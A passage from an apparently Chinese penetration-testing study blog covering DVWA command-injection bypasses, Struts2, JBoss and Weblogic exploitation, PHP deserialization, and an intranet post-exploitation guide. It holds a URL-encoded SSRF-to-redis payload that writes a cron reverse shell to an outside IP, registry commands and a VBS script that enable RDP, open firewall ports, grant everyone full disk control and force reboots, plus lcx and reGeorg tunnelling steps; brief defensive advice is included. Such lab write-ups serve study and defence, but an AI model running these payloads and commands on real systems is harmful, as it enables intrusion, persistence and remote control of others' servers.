<p><code>dir</code>;</p>
<p>知识点：在使用这种方法执行系统外部命令时，你要确保shell_exec函数可用，否则是无法使用这种反撇号执行系统外部命令的。</p>
<p><strong>安全性说明</strong>:当你使用这些函数执行命令时，如果是根据用户提交数据作为执行命令的话，你需要考虑<a href="https://links.jianshu.com/go?to=http://www.2cto.com/article/xitong/">系统安全</a>性，可以使用escapeshellcmd()和escapeshellarg()函数阻止用户恶意在系统上执行命令，escapeshellcmd()针对的是执行的系统命令，而escapeshellarg()针对的是执行系统命令的参数。这两个参数有点类似addslashes()的功能。</p>
<h2 id="完成dvwa三个级别实验"><a href="#完成dvwa三个级别实验" class="headerlink" title="完成dvwa三个级别实验"></a>完成dvwa三个级别实验</h2><p><strong>Low级别</strong></p>
<p>当dvwa级别为low时可以看源代码没做过滤</p>
<p>我们便可以通过加&amp;&amp;、；、|、等符号入侵（当有&amp;&amp;时前面ip必须为真‘否则后面的命令不会执行当自有&amp;时前面ip为假那么命令便会在web存在的服务器执行）</p>
<p>我们便可以通过127.0.0.1&amp;&amp;ipconfig（各种命令）来执行命令</p>
<p><strong>Medium级别</strong></p>
<p>当在medium级别时我们可以看源代码将&amp;&amp;、；、过滤了</p>
<p>这时我们可以使用添加&amp;加空格或&amp;;&amp;    进行入侵</p>
<p><strong>High级别</strong></p>
<p>在high级别时我们可以看到源代码对以下做了过滤</p>
<p>此时我们可以添加|| （代码里面的|后有一个空格）进行入侵</p>
<p><strong>Impossible级别</strong>的代码加入了Anti-CSRF token，同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。</p>
<h2 id="struts2-048、045、052、057实验"><a href="#struts2-048、045、052、057实验" class="headerlink" title="struts2 048、045、052、057实验"></a>struts2 048、045、052、057实验</h2><p>参考文章：</p>
<p><a href="https://blog.csdn.net/weixin_43625577/article/details/97111575">https://blog.csdn.net/weixin_43625577/article/details/97111575</a></p>
<p><a href="https://www.sinesafe.com/article/20180823/struts2057.html">https://www.sinesafe.com/article/20180823/struts2057.html</a></p>
<h4 id="Struts2-045实验"><a href="#Struts2-045实验" class="headerlink" title="Struts2 045实验"></a>Struts2 045实验</h4><p>使用k8工具</p>
<p>执行添加账号命令</p>
<p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.jpg" alt="img"></p>
<p>上传木马小马</p>
<p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.jpg" alt="img"></p>
<p>链接小马上传大马</p>
<p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.jpg" alt="img"></p>
<h4 id="Struts2-048实验"><a href="#Struts2-048实验" class="headerlink" title="Struts2 048实验"></a>Struts2 048实验</h4><p>使用方法struts2_S2-048.py <url>  <cmd></p>
<p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.jpg" alt="img"></p>
<h4 id="Struts2-052实验"><a href="#Struts2-052实验" class="headerlink" title="Struts2 052实验"></a>Struts2 052实验</h4><p>参考<a href="https://www.cnblogs.com/Hi-blog/p/7510987.html">https://www.cnblogs.com/Hi-blog/p/7510987.html</a></p>
<p>针对版本Ubuntu 16.04 、Apache/2.4.18、Struts2.5 –</p>
<p>Struts2.5.12版本。：struts2-rest-showcase因为我的版本无漏洞就先把操作过程如下</p>
<p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.jpg" alt="img"></p>
<p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.jpg" alt="img"></p>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>就是把一个对象变成可以传输的字符串，目的就是为了方便传输。假设，我们写了一个class，这个class里面存有一些变量。当这个class被实例化了之后，在使用过程中里面的一些变量值发生了改变。以后在某些时候还会用到这个变量，如果我们让这个class一直不销毁，等着下一次要用它的时候再一次被调用的话，浪费系统资源。当我们写一个小型的项目可能没有太大的影响，但是随着项目的壮大，一些小问题被放大了之后就会产生很多麻烦。这个时候PHP就和我们说，你可以把这个对象序列化了，存成一个字符串，当你要用的时候再放他出来就好了。在我们讲PHP反序列化的时候，基本都是围绕着serialize()，unserialize()这两个函数。</p>
<p><strong>详细参考</strong>：</p>
<p><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>serialize()和 unserialize() 在 PHP内部实现上是没有漏洞的，之所以会产生反序列化漏洞是因为应用程序在处理对象、魔术函数以及序列化相关问题的时候导致的。</p>
<p>当传给 unserialize() 的参数可控时，那么用户就可以注入精心构造的 payload。当进行反序列化的时候就有可能会触发对象中的一些魔术方法，造成意想不到的危害。</p>
<p><strong>⛵PHP反序列化函数：</strong>serialize()，unserialize()</p>
<p><strong>⛵Java反序列化函数：</strong>ObjectOutputStream的writeObject()和ObjectInputStream的readObject()。</p>
<p>⛵常见的几个魔法函数：魔法函数前边都会有</p>
<p>__</p>
<p>__construct()当一个对象创建时被调用</p>
<p>__destruct()当一个对象销毁时被调用</p>
<p>__toString()当一个对象被当作一个字符串使用</p>
<p>__sleep() 在对象在被序列化之前运行</p>
<p>__wakeup将在序列化之后立即被调用</p>
<h3 id="完成反序列化pikachu实试"><a href="#完成反序列化pikachu实试" class="headerlink" title="完成反序列化pikachu实试"></a>完成反序列化pikachu实试</h3><p>在线反序列化工具：<a href="https://links.jianshu.com/go?to=https://www.w3cschool.cn/tools/index?name=unserialize">https://www.w3cschool.cn/tools/index?name=unserialize</a></p>
<p>输入payload：O:1:”S”:1:{s:4:”test”;s:29:”alert(‘xss’)”;}</p>
<p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.jpg" alt="img"></p>
<h3 id="完成jboss反序列化合webshell"><a href="#完成jboss反序列化合webshell" class="headerlink" title="完成jboss反序列化合webshell"></a>完成jboss反序列化合webshell</h3><p>历史漏洞参考;<a href="https://www.seebug.org/appdir/JBoss">https://www.seebug.org/appdir/JBoss</a></p>
<p><a href="https://www.jianshu.com/p/e34062e0a6f1">https://www.jianshu.com/p/e34062e0a6f1</a></p>
<p>新漏洞利用工具下载：<a href="https://github.com/yunxu1/jboss-_CVE-2017-12149">https://github.com/yunxu1/jboss-_CVE-2017-12149</a></p>
<p>老漏洞综合利用工具下载：<a href="https://download.csdn.net/download/sinat_26474359/10650591">https://download.csdn.net/download/sinat_26474359/10650591</a></p>
<p>我们使用java反序列化利用程序工具目标地址直接接根目录就行</p>
<p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.jpg" alt="img"></p>
<p>命令执行时用dir /s c:\jboss\index.jsp这种格式</p>
<p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.jpg" alt="img"></p>
<h3 id="jboss、Weblogic、redis默认端口号"><a href="#jboss、Weblogic、redis默认端口号" class="headerlink" title="jboss、Weblogic、redis默认端口号"></a>jboss、Weblogic、redis默认端口号</h3><p>Jboss默认端口号8080</p>
<p>Weblogic默认端口号7001</p>
<p>Redis默认端口号6379</p>
<h3 id="Weblogic反序列化、文件上传漏洞实验，记住漏洞编号"><a href="#Weblogic反序列化、文件上传漏洞实验，记住漏洞编号" class="headerlink" title="Weblogic反序列化、文件上传漏洞实验，记住漏洞编号"></a>Weblogic反序列化、文件上传漏洞实验，记住漏洞编号</h3><h4 id="文件上传漏洞实验"><a href="#文件上传漏洞实验" class="headerlink" title="文件上传漏洞实验"></a>文件上传漏洞实验</h4><p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.jpg" alt="img"></p>
<p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.jpg" alt="img"></p>
<h4 id="Weblogic反序列化"><a href="#Weblogic反序列化" class="headerlink" title="Weblogic反序列化"></a>Weblogic反序列化</h4><p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.jpg" alt="img"></p>
<h4 id="任意文件上传漏洞操作（CVE-2018-2894）"><a href="#任意文件上传漏洞操作（CVE-2018-2894）" class="headerlink" title="任意文件上传漏洞操作（CVE-2018-2894）"></a>任意文件上传漏洞操作（CVE-2018-2894）</h4><h3 id="Weblogic-ssrf漏洞利用过程"><a href="#Weblogic-ssrf漏洞利用过程" class="headerlink" title="Weblogic  ssrf漏洞利用过程"></a>Weblogic  ssrf漏洞利用过程</h3><p>参考：<a href="https://www.jianshu.com/p/97b157a20108">https://www.jianshu.com/p/97b157a20108</a></p>
<p><a href="https://links.jianshu.com/go?to=https://www.cnblogs.com/bmjoker/p/9759761.html">https://www.cnblogs.com/bmjoker/p/9759761.html</a></p>
<p>1、检测漏洞:直接访问：<a href="https://links.jianshu.com/go?to=http://ip:7001/uddiexplorer/">http://ip:7001/uddiexplorer/</a>,</p>
<p>     SSRF漏洞存在于<a href="https://links.jianshu.com/go?to=http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp">http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp</a></p>
<p>2、向服务器提交以下参数</p>
<blockquote>
<p>rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=<a href="http://127.0.0.1:7001/">http://127.0.0.1:7001</a></p>
</blockquote>
<p>关键点是operator这个参数，访问7001端口时返回一个404的状态码。</p>
<p>3、访问一个不存在的端口会返回以下信息。</p>
<p><img src="/image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.jpg" alt="img"></p>
<p>可以通过返回的信息不同，来判断端口开放的状态。</p>
<p>经过探测，我们发现了内网的一个IP存在6379端口，也就是redis服务：</p>
<p>我们这里要发送几行代码</p>
<p>发送三条redis命令，将弹shell脚本写入/etc/crontab：</p>
<p>把这三条命令通过get包注入进去，先要将命令用url进行编码</p>
<p>注意，换行符是“\r\n”，也就是“%0D%0A”</p>
<blockquote>
<p>test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.19.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</p>
</blockquote>
<p>然后我们把构造好的数据包通过burp进行发送 , 将url编码后的字符串放在ssrf的域名后面，发送：</p>
<p>接着靶机上开启端口监听，nc-lvnp 21 ,反弹shell。成功。</p>
<h3 id="反序列化及命令执行防范方法"><a href="#反序列化及命令执行防范方法" class="headerlink" title="反序列化及命令执行防范方法"></a>反序列化及命令执行防范方法</h3><h4 id="🚢反序列化漏洞防御："><a href="#🚢反序列化漏洞防御：" class="headerlink" title="🚢反序列化漏洞防御："></a><strong>🚢反序列化漏洞防御：</strong></h4><p>1、类的白名单校验机制：</p>
<p> 实际上原理很简单，就是对所有传入的反序列化对象，在反序列化过程开始前，对类型名称做一个检查，不符合白名单的类不进行反序列化操作。很显然，这个白名单肯定是不存在Runtime的。</p>
<p>2、 禁止JVM执行外部命令Runtime.exec </p>
<p>这个措施可以通过扩展 SecurityManager 可以实现。      </p>
<h4 id="PHP防御"><a href="#PHP防御" class="headerlink" title="PHP防御"></a>PHP防御</h4><p>1、安全配置好php相关参数：通过Php配置文件里面有个disable_functions = 配置，这个禁止某些php函数，</p>
<p>服务器便是用这个来禁止php的执行命令函数。</p>
<p><strong>🪂例如：</strong>disable_functions=system,passthru,shell_exec,exec,popen 便禁止了用这些函数来执行系统命令。</p>
<p>2、升级中间件</p>
<p>3、严格控制传入变量，严谨使用魔法函数</p>
<h4 id="weblogic防御"><a href="#weblogic防御" class="headerlink" title="weblogic防御"></a>weblogic防御</h4><p>1、过滤T3协议，限定可连接的IP</p>
<p>2、设置Nginx反向代理，实现t3协议和http协议隔离</p>
<p>3、JEP290（JDK8u121，7u131，6u141），这个机制主要是在每层反序列化过程中都加了一层黑名单处理</p>
<h4 id="原生反序列化防御"><a href="#原生反序列化防御" class="headerlink" title="原生反序列化防御"></a>原生反序列化防御</h4><p>1、不要反序列化不可信的数据</p>
<p>2、 给反序列数据加密签名，并确保解密在反序列之前</p>
<p>3、给反序列化接口添加认证授权</p>
<p>4、 反序列化服务只允许监听在本地或者开启相应防火墙</p>
<p>5、 升级第三方库</p>
<p>6、升级JDK，JEP290</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透</title>
    <url>/2020/08/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h2 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h2><p><img src="/image/%E8%84%91%E5%9B%BE/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.png"></p>
<h2 id="内网概述"><a href="#内网概述" class="headerlink" title="内网概述"></a>内网概述</h2><p>内网IP是以下面几个段bai开头的IP.用户可以自己设置du.常用的zhi内网IP地址:</p>
<ul>
<li>10.x.x.x</li>
<li>172.16.x.x至172.31.x.x</li>
<li>192.168.x.x</li>
</ul>
<p>　内网的计算机以<strong>NAT</strong>（网络地址转换）协议，通过一个公共的网关访问Internet。内网的计算机可向Internet上的其他计算机发送连接请求，但Internet上其他的计算机无法向内网的计算机发送连接请求。</p>
<p>　NAT（Network Address Translator）是网络地址转换，它实现内网的IP地址与公网的地址之间的相互转换，将大量的内网IP地址转换为一个或少量的公网IP地址，减少对公网IP地址的占用。NAT的最典型应用是：在一个局域网内，只需要一台计算机连接上Internet，就可以利用NAT共享Internet连接，使局域网内其他计算机也可以上网。使用NAT协议，局域网内的计算机可以访问Internet上的计算机，但Internet上的计算机无法访问局域网内的计算机。</p>
<p>　Windows操作系统的Internet连接共享、sygate、winroute、unix/linux的natd等软件，都是使用NAT协议来共享Internet连接。　　</p>
<p>    所有ISP（Internet服务提供商）提供的内网Internet接入方式，几乎都是基于NAT协议的。</p>
<h3 id="内网IP-详细"><a href="#内网IP-详细" class="headerlink" title="内网IP 详细:"></a><strong>内网IP 详细</strong>:</h3><p>大部分网络使用B类或C类地址，每一个类的第一个八位组的范围如下：</p>
<h4 id="1、-0-—127。"><a href="#1、-0-—127。" class="headerlink" title="1、 0-—127。"></a>1、 0-—127。</h4><p>A类 网络号码范围是 0.0.0.0—127.0.0.0 ,用于128个网络。但网络不能全由0组成且127.0.0.0保留用于回路。剩下的126个网络，1到126，共有16777214个可能的主机地址（16777216减2）</p>
<p>A类 网络 —主机—主机—主机</p>
<p>0-127 127 0 0 0</p>
<h4 id="2、-128—191。"><a href="#2、-128—191。" class="headerlink" title="2、 128—191。"></a>2、 128—191。</h4><p>B类，网络号码范围是128.0.0.0–191.254.0.0 用于16256个网络。共有65534个可能的主机地址</p>
<p>B类 网络—网络—-主机—主机</p>
<p>128-191 128 123 0 0</p>
<h4 id="3、-192–223。"><a href="#3、-192–223。" class="headerlink" title="3、 192–223。"></a>3、 192–223。</h4><p>C类，网络号码范围是192.0.0.0–223.254.254.0，用于2064512个网络。共有254个可能的主机地址</p>
<p>C类 网络—网络—-网络—主机</p>
<p>192-223 192 0 0 0</p>
<p>所有的网络空间计算都必须“减2”，这是因为要扣除两个保留地址：“0”为网络号，“255”为广播。地址1-254分配给主机。</p>
<p>第一个八位组号码224-254保留给在这儿未讨论的特殊类（组播和实验）。</p>
<p>通过上述讨论，可以知道只有很少数非常大的组织才能拥有A类地址，实际上只有126个这样的组织，我们中大多数用的是B类和C类IP地址与INTERNET相连。</p>
<h2 id="🎃一、通过webshell开启3389"><a href="#🎃一、通过webshell开启3389" class="headerlink" title="🎃一、通过webshell开启3389"></a>🎃一、通过webshell开启3389</h2><p>1.查询终端端口</p>
<h2 id="xp-amp-2003：REG-query-HKLM-SYSTEM-CurrentControlSet-Control-Terminal”-“Server-WinStations-RDP-Tcp-v-PortNumber"><a href="#xp-amp-2003：REG-query-HKLM-SYSTEM-CurrentControlSet-Control-Terminal”-“Server-WinStations-RDP-Tcp-v-PortNumber" class="headerlink" title="xp&amp;2003：REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server\WinStations\RDP-Tcp /v PortNumber"></a>xp&amp;2003：REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server\WinStations\RDP-Tcp /v PortNumber</h2><p>通用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">regedit &#x2F;e tsp.reg &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal server\Wds\rdpwd\Tds\tcp&quot;</span><br><span class="line">type tsp.reg</span><br></pre></td></tr></table></figure>

<p>2.开启XP&amp;2003终端服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br></pre></td></tr></table></figure>

<p>3.更改终端端口为20008(0x4E28)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\Wds\rdpwd\Tds\tcp &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x4E28 &#x2F;f</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x4E28 &#x2F;f</span><br></pre></td></tr></table></figure>

<p>4.取消xp&amp;2003系统防火墙对终端服务3389端口的限制及IP连接的限制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List &#x2F;v 3389:TCP &#x2F;t REG_SZ &#x2F;d 3389:TCP:*:Enabled:@xpsp2res.dll,-22009 &#x2F;f</span><br></pre></td></tr></table></figure>

<p>5.开启Win2000的终端，端口为3389(需重启)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo Windows Registry Editor Version 5.00 &gt;2000.reg</span><br><span class="line">echo. &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\netcache] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;Enabled&quot;&#x3D;&quot;0&quot; &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;ShutdownWithoutLogon&quot;&#x3D;&quot;0&quot; &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;EnableAdminTSRemote&quot;&#x3D;dword:00000001 &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;TSEnabled&quot;&#x3D;dword:00000001 &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermDD] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;Start&quot;&#x3D;dword:00000002 &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermService] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;Start&quot;&#x3D;dword:00000002 &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_USERS\.DEFAULT\Keyboard Layout\Toggle] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;Hotkey&quot;&#x3D;&quot;1&quot; &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;PortNumber&quot;&#x3D;dword:00000D3D &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;PortNumber&quot;&#x3D;dword:00000D3D &gt;&gt;2000.reg</span><br></pre></td></tr></table></figure>

<p>6.强行重启Win2000&amp;Win2003系统(执行完最后一条一句后自动重启)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@ECHO OFF &amp; cd&#x2F;d %temp% &amp; echo [version] &gt; restart.inf</span><br><span class="line">(set inf&#x3D;InstallHinfSection DefaultInstall)</span><br><span class="line">echo signature&#x3D;$chicago$ &gt;&gt; restart.inf</span><br><span class="line">echo [defaultinstall] &gt;&gt; restart.inf</span><br><span class="line">rundll32 setupapi,%inf% 1 %temp%\restart.inf</span><br></pre></td></tr></table></figure>

<p>7.禁用TCP/IP端口筛选 (需重启)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\ControlSet001\Services\Tcpip\parameters &#x2F;v EnableSecurityFilters &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br></pre></td></tr></table></figure>

<p>8.终端超出最大连接数时可用下面的命令来连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mstsc &#x2F;v:ip:3389 &#x2F;console</span><br></pre></td></tr></table></figure>

<p>9.调整NTFS分区权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cacls c: &#x2F;e &#x2F;t &#x2F;g everyone:F (所有人对c盘都有一切权利)</span><br><span class="line"></span><br><span class="line">cacls %systemroot%\system32\*.exe &#x2F;d everyone (拒绝所有人访问system32中exe文件)</span><br><span class="line"></span><br><span class="line">------------------------------------------------------</span><br><span class="line">3389.vbs cscript.exe</span><br><span class="line">------------------------------------------------------</span><br><span class="line"></span><br><span class="line">On Error Resume Next</span><br><span class="line">const HKEY_LOCAL_MACHINE &#x3D; &amp;H80000002</span><br><span class="line">strComputer &#x3D; &quot;.&quot;</span><br><span class="line">Set StdOut &#x3D; WScript.StdOut</span><br><span class="line">Set oReg&#x3D;GetObject(&quot;winmgmts:&#123;impersonationLevel&#x3D;impersonate&#125;!\\&quot; &amp;_</span><br><span class="line">strComputer &amp; &quot;\root\default:StdRegProv&quot;)</span><br><span class="line">strKeyPath &#x3D; &quot;SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span><br><span class="line">oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath</span><br><span class="line">strKeyPath &#x3D; &quot;SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp&quot;</span><br><span class="line">oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath</span><br><span class="line">strKeyPath &#x3D; &quot;SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span><br><span class="line">strKeyPath &#x3D; &quot;SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span><br><span class="line">strValueName &#x3D; &quot;fDenyTSConnections&quot;</span><br><span class="line">dwValue &#x3D; 0</span><br><span class="line">oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,dwValue</span><br><span class="line">strKeyPath &#x3D; &quot;SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp&quot;</span><br><span class="line">strValueName &#x3D; &quot;PortNumber&quot;</span><br><span class="line">dwValue &#x3D; 3389</span><br><span class="line">oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,dwValue</span><br><span class="line">strKeyPath &#x3D; &quot;SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span><br><span class="line">strValueName &#x3D; &quot;PortNumber&quot;</span><br><span class="line">dwValue &#x3D; 3389</span><br><span class="line">oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,dwValue</span><br><span class="line">Set R &#x3D; CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">R.run(&quot;Shutdown.exe -r -t 0&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="通过3389工具开启远程终端"><a href="#通过3389工具开启远程终端" class="headerlink" title="通过3389工具开启远程终端"></a>通过3389工具开启远程终端</h3><h2 id="服务器端口被修改如何查找"><a href="#服务器端口被修改如何查找" class="headerlink" title="服务器端口被修改如何查找"></a>服务器端口被修改如何查找</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">目前主要通过注册表读取、端口扫描、命令探针等三种方法查找修改后的端口</span><br></pre></td></tr></table></figure>

<h2 id="服务器处于内网如何远程连接"><a href="#服务器处于内网如何远程连接" class="headerlink" title="服务器处于内网如何远程连接"></a>服务器处于内网如何远程连接</h2><h3 id="1、拥有公网ip的条件下"><a href="#1、拥有公网ip的条件下" class="headerlink" title="1、拥有公网ip的条件下"></a>1、拥有公网ip的条件下</h3><p>1、通过lcx工具解决内网远程连接<br>上传一个cmd.exe文件和lck工具然后setp cmd.exe设置终端路径解决运行权限问题。</p>
<blockquote>
<p>Webshell上执行：lcx.exe -slave 自己的公网ip 2222 127.0.0.1 3389 （将本机3389端口流量转发到公网ip的2222端口上去）</p>
</blockquote>
<blockquote>
<p>自己的电脑里面执行：lcx.exe -listen 2222 4444 （监听本地的2222端口将流量转发到4444 ）</p>
</blockquote>
<h3 id="2、没有公网ip的情况下"><a href="#2、没有公网ip的情况下" class="headerlink" title="2、没有公网ip的情况下"></a>2、没有公网ip的情况下</h3><h4 id="通过端口转发脚本解决内网远程连接"><a href="#通过端口转发脚本解决内网远程连接" class="headerlink" title="通过端口转发脚本解决内网远程连接"></a>通过端口转发脚本解决内网远程连接</h4><blockquote>
<p>只能通过内网的web进行连接<br>使用reDuhGUI_0.1工具利用菜刀将reDuh.php脚本上传到靶机。然后双击物理机的reDuhGUI.exe运行脚本<br>如果有安全狗会被拦截</p>
</blockquote>
<h2 id="内网渗透（内到内到内渗透）"><a href="#内网渗透（内到内到内渗透）" class="headerlink" title="内网渗透（内到内到内渗透）"></a>内网渗透（内到内到内渗透）</h2><p>内网渗透使用这两个工具–reGeorg+Proxifier<br>首先进入regeorg文件将tunnel.nosocket.php上传到靶机web根目录本地python运行 pip install urllib3环境下执行cmd<br>reGeorg-master[reGeorgSocksProxy.py](<a href="https://links.jianshu.com/go?to=http://reGeorgSocksProxy.py">https://links.jianshu.com/go?to=http%3A%2F%2FreGeorgSocksProxy.py</a>) -p  9999 -u <a href="https://links.jianshu.com/go?to=http://192.168.60.118:8080/tunnel.nosocket.php">http://192.168.60.118:8080/tunnel.nosocket.php</a></p>
<p><img src="/image/%E5%86%85%E7%BD%91.jpg"></p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>应用程序技术</title>
    <url>/2019/06/12/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<h1 id="Web-应用程序技术"><a href="#Web-应用程序技术" class="headerlink" title="Web 应用程序技术"></a>Web 应用程序技术</h1><p>Web应用程序使用各种不同的技术实现其功能。本章简要介绍渗透侧试员在攻击Web应用程序时可能遇到的关键技术。我们将分析HTTP协议、服务器和客户端常用的技术以及用于在各种情形下呈现数据的编码方案。这些技术大都简单易懂，掌握其相关特性对于向Web应用程序发动有效攻击极其重要。</p>
